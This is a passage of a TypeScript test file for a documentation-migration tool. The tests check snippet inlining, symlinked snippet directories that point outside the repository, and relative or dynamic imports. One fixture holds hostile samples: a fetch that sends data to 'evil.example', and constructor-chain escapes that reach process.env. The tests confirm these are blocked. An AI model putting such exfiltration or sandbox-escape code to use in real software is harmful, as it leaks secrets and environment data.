    }, "import { $x, b } from '/snippets/c.mdx';\n\nV {$x} {b}")
    expect(warnings.some((warning) => warning.message.includes('is not exported'))).toBe(false)
    // Both are real exports, so they are reported as not inlinable (they read
    // an import), never as missing.
    expect(warnings.filter((warning) => warning.message.includes('could not be inlined')).map((warning) => warning.message.match(/"([^"]+)"/)?.[1]).sort()).toEqual(['$x', 'b'])

    const start = performance.now()
    snippetFixture({ 'snippets/c.mdx': 'export { a, '.repeat(5000) }, "import { q } from '/snippets/c.mdx';\n\nV {q}")
    expect(performance.now() - start).toBeLessThan(1000)
  })

  it('does not inline a function that can reach Function, globals or the network, but keeps pure helpers', () => {
    const files = {
      'snippets/c.mdx': [
        "export const viaFunction = () => Function('return process')().env;",
        "export const viaGlobal = () => globalThis.process.env;",
        "export const viaFetch = (x) => fetch('https://evil.example/?d=' + x);",
        "export const viaCtor = () => ({}).constructor.constructor('return process')();",
        "export const viaKey = (k) => ({})[k][k]('return process')();",
        "export const fee = (type, value) => { if (type === 'a') return '5%'; return String(Math.round(Number(value))); };",
        '',
      ].join('\n'),
    }
    const safe = snippetFixture(files, "import { fee } from '/snippets/c.mdx';\n\n{fee('a', 1)}")
    expect(safe.page?.body).toContain('export const fee = ')
    for (const name of ['viaFunction', 'viaGlobal', 'viaFetch', 'viaCtor', 'viaKey']) {
      const { page, warnings } = snippetFixture(files, `import { ${name} } from '/snippets/c.mdx';\n\n{${name}()}`)
      expect(page?.body).toContain(`export const ${name} = undefined;`)
      expect(page?.body).not.toContain('return process')
      expect(warnings.some((warning) => warning.message.includes(`"${name}"`) && warning.message.includes('could not be inlined'))).toBe(true)
    }
  })

  it('treats a symlinked snippets directory that points outside the repository as missing', () => {
    const outside = mkdtempSync(join(tmpdir(), 'thally-migrate-outside-'))
    writeFileSync(join(outside, 's.mdx'), "export const SECRET = 'leaked-value';\nexport const Box = () => <b>leaked-component</b>;\n")
    const imports = [
      "import { SECRET } from '/snippets/s.mdx';\n\nV {SECRET}",
      "import { Box } from '/snippets/s.mdx';\n\n<Box />",
      '<Snippet file="s.mdx" />',
    ]
    for (const body of imports) {
      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-symlink-snippets-'))
      symlinkSync(outside, join(root, 'snippets'))
      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home'] } }))
      writeFileSync(join(root, 'home.mdx'), `---\ntitle: Home\n---\n\n${body}\n`)
      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
      const page = bundle.pages.find((candidate) => candidate.id === 'home')
      expect(page?.body ?? '').not.toContain('leaked')
      expect(bundle.warnings.some((warning) => warning.source === 'home.mdx' && /s\.mdx/.test(warning.message))).toBe(true)
      expect(bundle.warnings.some((warning) => warning.source === 'home.mdx' && warning.code === 'skipped-file')).toBe(false)
    }
  })

  it('excludes a page whose dynamic import() uses a relative module the migration does not ship', () => {
    const files = { 'lib/m.ts': 'export const m = 1\n' }
    for (const body of [
      "export const load = () => import('./lib/missing')\n\nText.",
      "{import('./lib/missing')}\n\nText.",
      "<Card title={String(import('./lib/missing'))}>Text.</Card>",
    ]) {
      // The only page is excluded, so the migration reports why and stops.
      expect(() => snippetFixture(files, body)).toThrow(/imports "\.\/lib\/missing"/)
    }
    expect(snippetFixture(files, '<Card title="import(\'./lib/m\')">Text.</Card>').page).toBeDefined()
  })

  describe('relative imports of files the migration ships', () => {
    const shipped = {
      'comp.jsx': 'export default function Comp() { return <b>x</b> }\nexport const Named = () => <i>n</i>\n',
      'lib/m.ts': 'export const m = 1\n',
      'styles.css': 'a { color: red }\n',
      'setup.js': 'globalThis.ready = true\n',
    }
    function keptPage(body: string, files: Record<string, string> = shipped) {
      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-relative-kept-'))
      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home', 'other'] } }))
      for (const [path, content] of Object.entries(files)) {
        mkdirSync(dirname(join(root, path)), { recursive: true })
        writeFileSync(join(root, path), content)
      }
      writeFileSync(join(root, 'home.mdx'), `---\ntitle: Home\n---\n\n${body}\n`)
      writeFileSync(join(root, 'other.mdx'), '---\ntitle: Other\n---\n\nHi\n')
      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
      return { page: bundle.pages.find((candidate) => candidate.id === 'home'), warnings: bundle.warnings.filter((warning) => warning.source === 'home.mdx') }
    }

    it('strips a relative side-effect import with a warning and keeps the page', () => {
      for (const specifier of ['./styles.css', './setup.js', './missing.js']) {
        const { page, warnings } = keptPage(`import '${specifier}'\n\nText.`)
        expect(page?.body).not.toContain(specifier)
        expect(warnings).toContainEqual(expect.objectContaining({ code: 'unsupported-config', message: expect.stringContaining(`side-effect import of "${specifier}"`) }))
        expect(warnings.some((warning) => warning.code === 'skipped-file' || /was preserved/.test(warning.message))).toBe(false)
      }
    })

    it('rewrites a namespace import and a dynamic import of a shipped file to the migrated path', () => {
      const ns = keptPage("import * as X from './comp.jsx'\n\n<X.Named />")
      expect(ns.page?.body).toMatch(/import \* as X from "@\/mdx\/migrated\//)
      expect(ns.page?.body).not.toContain('./comp.jsx')
      for (const body of [
        "export const load = () => import('./lib/m')\n\nText.",
        "{import('./comp.jsx')}\n\nText.",
        "<Card title={String(import('./lib/m'))}>Text.</Card>",
      ]) {
        const { page, warnings } = keptPage(body)
        expect(page?.body).toMatch(/import\("@\/mdx\/migrated\//)
        expect(page?.body).not.toMatch(/import\('\.\//)
        expect(warnings.some((warning) => warning.code === 'skipped-file')).toBe(false)
      }
    })

    it('rewrites a re-export from a shipped file to the migrated path and keeps the page', () => {
      for (const body of [
        "export { Named } from './comp.jsx'\n\nText.",
        "export * from './lib/m'\n\nText.",
        "export { default as Comp } from './comp.jsx'\n\nText.",
      ]) {
        const { page, warnings } = keptPage(body)
        expect(page?.body).toMatch(/export (\{[^}]*\}|\*) from "@\/mdx\/migrated\//)
        expect(page?.body).not.toMatch(/from '\.\//)
        expect(warnings.some((warning) => warning.code === 'skipped-file')).toBe(false)
      }
    })

    it('excludes a page that re-exports from a file that is not shipped', () => {
      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-relative-reexport-'))
      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home', 'other'] } }))
      writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nexport { metadata } from './metadata'\n\nText.\n")
      writeFileSync(join(root, 'other.mdx'), '---\ntitle: Other\n---\n\nHi\n')
      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
      expect(bundle.pages.map((page) => page.id)).toEqual(['other'])
    })

    it('excludes a namespace import of a file that is not shipped with a single warning', () => {
      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-relative-ns-'))
      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home', 'other'] } }))
      writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport * as M from './metadata'\n\nText.\n")
      writeFileSync(join(root, 'other.mdx'), '---\ntitle: Other\n---\n\nHi\n')
      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
      expect(bundle.pages.map((page) => page.id)).toEqual(['other'])
      const messages = bundle.warnings.filter((warning) => warning.source === 'home.mdx').map((warning) => warning.message)
      expect(messages.some((message) => /Page was excluded/.test(message))).toBe(true)
      expect(messages.some((message) => /was preserved/.test(message))).toBe(false)
    })
  })

  it('does not inline a snippet whose frontmatter is invalid YAML, by import, value import, file tag or global alias', () => {
    const bad = '---\ntitle: [unclosed\n---\nexport const KEY = "leaked-value";\n\n<b>leaked-component</b>\n'
    const files = { 'snippets/my-box.mdx': bad }
    for (const body of [
      "import MyBox from '/snippets/my-box.mdx';\n\n<MyBox />",
      "import { KEY } from '/snippets/my-box.mdx';\n\nV {KEY}",
      '<Snippet file="my-box.mdx" />',
      '<MyBox />',
    ]) {
      const { page, warnings } = snippetFixture(files, body)
      expect(page?.body ?? '').not.toContain('leaked')
      expect(warnings.some((warning) => warning.message.includes('frontmatter that could not be read') && warning.source === 'home.mdx')).toBe(true)
    }
  })
})

